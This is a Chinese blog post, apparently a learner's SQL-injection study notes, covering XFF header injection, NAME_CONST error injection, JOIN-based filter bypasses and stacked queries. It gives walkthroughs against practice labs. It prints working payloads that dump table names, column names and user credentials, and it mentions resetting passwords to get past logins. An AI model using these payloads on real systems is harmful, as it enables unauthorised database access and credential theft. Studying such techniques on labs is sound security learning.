@@ -1,0 +1,165 @@
+<!DOCTYPE html><html lang="en" theme-mode="light"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Sql注入学习笔记#15 | Vincent</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":"all","activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://cdnjson.com/images/2023/05/14/bg.jpg');
+  --light-background: url('https://cdnjson.com/images/2023/05/14/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>Sql注入学习笔记#15</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-06-10T09:39:34.000Z" id="date"> 2023-06-10</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-06-19T03:47:14.810Z" id="updated"> 2023-06-19</time></div></span></div></div><hr><div id="post-content"><p>这篇文章学习xff注入、NAME_CONST报错注入、</p>
+<p>Join实战中的运用，以及堆叠注入</p>
+<span id="more"></span>
+
+<h1 id="XFF-Basic"><a href="#XFF-Basic" class="headerlink" title="XFF-Basic"></a>XFF-Basic</h1><p>首先知道xff注入是什么吧</p>
+<blockquote>
+<p>XFF，是X-Forwarded-for的缩写，XFF注入是SQL注入的一种，该注入原理是通过修改X-Forwarded-for头对带入系统的dns进行sql注入，从而得到网站的数据库内容。</p>
+</blockquote>
+<p>事实上，他也是http头的一部分，</p>
+<p>和前面的referer，cookie，user-agent差不多，</p>
+<p>同样可以使用常规的语句进行sql注入</p>
+<h1 id="XFF-实战注入"><a href="#XFF-实战注入" class="headerlink" title="XFF-实战注入"></a>XFF-实战注入</h1><p>靶场：</p>
+<p><a target="_blank" rel="noopener" href="https://www.mozhe.cn/bug/detail/QWxmdFFhVURDay90L0wxdmJXSkl5Zz09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/QWxmdFFhVURDay90L0wxdmJXSkl5Zz09bW96aGUmozhe</a></p>
+<p>是一个登陆界面，post注入，尝试万能密码，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">admin&#x27; or 1=1 #<br></code></pre></td></tr></table></figure>
+
+<p>失败，尝试更改闭合，失败，</p>
+<p>尝试referer注入，失败，</p>
+<p>但是注入时出现了这样一个弹窗，</p>
+
+
+<p>出现ip字段，确定是xff，但是倔强的我，，，</p>
+<p>偏要试试ua注入行不行——不行</p>
+<p>然后开始xff注入，</p>
+<p>首先判断闭合：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">X-Forwarded-For: 127.0.0.1&#x27;<br></code></pre></td></tr></table></figure>
+
+<p>单引号报错，双引号不报错，后面确认闭合是单引号，</p>
+<p>开始构造语句，</p>
+<p>首先直接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">127.0.0.1&#x27; order by n#<br></code></pre></td></tr></table></figure>
+
+<p>没有正确回显，常规的union select不可以了，</p>
+<p>尝试报错注入，这里使用extractvalue</p>
+
+
+<p>到这里就成功了，后面就是老一套流程了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">-127.0.0.1&#x27;,extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())))) # ---&gt; logins,user<br><br>-127.0.0.1&#x27;,extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;user&#x27;)))) #  ---&gt; id,username,password<br><br>-127.0.0.1&#x27;,extractvalue(1,concat(0x7e,(select group_concat(id,username,password) from user)))) # ---&gt; 1admin1526328305<br></code></pre></td></tr></table></figure>
+
+
+
+<p>拿下~</p>
+<h1 id="NAME-CONST-Basic"><a href="#NAME-CONST-Basic" class="headerlink" title="NAME_CONST - Basic"></a>NAME_CONST - Basic</h1><p>MySQL中的name_const()函数是用于创建一个带有指定名称和值的常量。它的语法如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">name_const(name, value)<br></code></pre></td></tr></table></figure>
+
+<p>其中，name是常量的名称，value是常量的值。</p>
+<p>示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT name_const(&#x27;PI&#x27;, 3.141592653589793) AS pi_value;<br></code></pre></td></tr></table></figure>
+
+<p>该查询将创建一个名为“PI”的常量，并将其值设置为3.141592653589793，然后将该常量作为pi_value返回。</p>
+<p>常量在MySQL中是只读变量，一旦创建，就不能被修改或删除。name_const()函数使得可以创建常量来在查询中引用任意值，这些值可以再次引用而无需重复输入。该函数功能比较简单，但是在某些场景下非常有用。</p>
+<hr>
+<p>但是，这个函数有一个弊端，</p>
+<p>在mysql版本5.0之后就不适用了</p>
+<hr>
+<p>首先我们看一下基本的语句</p>
+<p>采用join连接查询构造查询语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">select * from (select * from(select name_const((你的语句),0)) a join (select name_const((你的语句),0))b)c;<br></code></pre></td></tr></table></figure>
+
+<p>注意两个“你的语句”应该相同</p>
+<p>参考：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1YE411c7HH">https://www.bilibili.com/video/BV1YE411c7HH</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_46706771/article/details/112768863"> MYSQL 通过NAME_CONST()报错注入</a></p>
+</blockquote>
+<p>这里介绍一下exist函数：</p>
+<p>MySQL函数<code>EXISTS</code> 接受一个子查询作为参数，并返回一个布尔值。如果子查询返回任何行，则<code> EXISTS</code> 返回 <code>TRUE</code>, 否则返回 <code>FALSE</code>。</p>
+<p>下面是<code>EXISTS</code> 函数的一些示例:</p>
+<ol>
+<li>检查表中是否存在某个匹配行</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT * FROM products WHERE EXISTS(SELECT * FROM categories WHERE products.category_id = categories.id);<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li>使用 EXISTS 实现条件逻辑</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">SELECT order_number, customer_id FROM orders WHERE EXISTS (SELECT * FROM order_details WHERE orders.order_number = order_details.order_number AND order_details.product_code = &#x27;CSS1&#x27;);<br></code></pre></td></tr></table></figure>
+
+<p>在这个例子中， 假设我们想找到所有购买了“CSS1”产品的客户，那么可以使用<code>EXISTS</code> 条件来完成。</p>
+<h1 id="Join-Basic"><a href="#Join-Basic" class="headerlink" title="Join - Basic"></a>Join - Basic</h1><p>这个我之前博客介绍过了</p>
+<p><a target="_blank" rel="noopener" href="https://www.handsome-vincent.space/2023/06/08/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-12/#5-%E9%80%97%E5%8F%B7%E7%BB%95%E8%BF%87">这里</a></p>
+<p>具体的示例这里有个文章介绍的很好：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_48083470/article/details/119043137">SQL注入 right&#x2F;left join 详解与利用_sql注入join</a></p>
+<p>之前笔记提到了两个语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">union select * from (select 1)a join (select 2)b join (select 3)c--+<br><br>union select * from (select * from users join users as b)c --+<br></code></pre></td></tr></table></figure>
+
+<p>他们两个的用处完全不同，</p>
+<p>第一个语句是用来绕过逗号过滤的，</p>
+<p>他的原理就是将分别select1，2，3的结果拼接起来，</p>
+<p>而后面的那个测试通过join的特性来碰撞出列名，</p>
+<p>这一般用来绕过过滤information_schema.columns</p>
+<p>这里拿Less1 实战一下</p>
+<h1 id="Join-实战注入"><a href="#Join-实战注入" class="headerlink" title="Join - 实战注入"></a>Join - 实战注入</h1><ol>
+<li><p>获取字段数</p>
+</li>
+<li><p>获取表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select * from (select 1)a join (select 2)b join (select group_concat(table_name) from information_schema.tables where table_schema=database())c --+<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select * from (select * from users as a join users as b)c --+<br><br>?id=-1&#x27; union select * from (select * from users as a join users as b using(id))c --+<br><br>?id=-1&#x27; union select * from (select * from users as a join users as b using(id,username))c --+<br><br>?id=-1&#x27; union select * from (select * from users as a join users as b using(id,username,password))c --+<br></code></pre></td></tr></table></figure>
+
+<p>到这里页面没有报错了，说明就是这三列了</p>
+</li>
+<li><p>获取全部数据</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">?id=-1&#x27; union select * from (select 1)a join (select 2)b join (select group_concat(id,username,password) from users)c--+<br></code></pre></td></tr></table></figure></li>
+</ol>
+<p>到此结束</p>
+<h1 id="堆叠注入-basic"><a href="#堆叠注入-basic" class="headerlink" title="堆叠注入 - basic"></a>堆叠注入 - basic</h1><p>堆叠注入的前提是网页源代码对语句使用的是mysqli_multi_query</p>
+<p>而不是mysqli_query，知道了这，我们就可以使用分号来分割我们的语句，</p>
+<p>然后进行多个操作（在一个语句中）</p>
+<p>例如</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">show databases;select user();<br></code></pre></td></tr></table></figure>
+
+<h1 id="堆叠注入-实战"><a href="#堆叠注入-实战" class="headerlink" title="堆叠注入 - 实战"></a>堆叠注入 - 实战</h1><p>sqllabs-38</p>
+
+
+<p>一般在实战中，</p>
+<p>我们可以通过堆叠注入来绕过union select过滤或者查杀，</p>
+<p>以及通过修改密码的方式来绕过登录密码，</p>
+<p>（就和todesk替换config.ini远控那个思路一样）</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38612882/article/details/122589853">渗透测试-SQL注入之堆叠注入-攻防世界supersqli实战_保持微笑-泽的博客-CSDN博客</a></p>
+</blockquote>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/06/11/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-16/">← Next Sql注入学习笔记#16</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/06/09/Sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-14/">Sql注入学习笔记#14 Prev →</a></div></div></div><div id="comments"><div class="selector"><button class="valine-sel"></button></div><div id="valine"></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="./img/logo.jpg" alt="Logo"></a><h1 id="Dr"><a href="/">Vincent</a></h1><div id="description"><p>不与无谓人争气</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XFF-Basic"><span class="toc-number">1.</span> <span class="toc-text">XFF-Basic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XFF-%E5%AE%9E%E6%88%98%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">XFF-实战注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NAME-CONST-Basic"><span class="toc-number">3.</span> <span class="toc-text">NAME_CONST - Basic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Join-Basic"><span class="toc-number">4.</span> <span class="toc-text">Join - Basic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Join-%E5%AE%9E%E6%88%98%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">Join - 实战注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-basic"><span class="toc-number">6.</span> <span class="toc-text">堆叠注入 - basic</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E5%AE%9E%E6%88%98"><span class="toc-number">7.</span> <span class="toc-text">堆叠注入 - 实战</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {new Valine({
+ el: '#valine'
+ , appId: 'HPascq2qxfVnEiu0BvuEltaD-gzGzoHsz'
+ , appKey: 'AKHEZyHQcEOLkAQk07kDBYgN' , placeholder: 'This comment is sent by Penguin Logistics.'
+ , path: window.location.pathname
+});code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
